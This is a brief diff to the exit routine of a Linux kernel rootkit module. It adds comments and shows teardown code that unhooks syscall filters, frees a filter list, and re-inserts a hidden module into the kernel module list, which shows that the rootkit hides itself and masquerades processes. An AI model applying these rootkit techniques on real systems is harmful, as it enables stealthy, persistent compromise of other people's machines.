@@ -265,6 +265,7 @@ static int __init rootkit_init(void) {
 static void __exit rootkit_exit(void) {
   struct filter_info *pos, *next;
 
+  // unhook syscalls
   for (int syscall_num = 0; syscall_num < NR_syscalls; syscall_num++) {
     if (total_references[syscall_num] > 0) {
       list_for_each_entry(pos, &filter_list.list, list) {
@@ -286,11 +287,15 @@ static void __exit rootkit_exit(void) {
   }
   */
 
+  // cleanup filter list
   list_for_each_entry_safe(pos, next, &filter_list.list, list) {
     list_del(&pos->list);
     kfree(pos);
   }
 
+  // unmasquerade processes
+
+  // unhide module
   if (is_hidden && module_list) {
     list_add(&THIS_MODULE->list, module_list);
   }
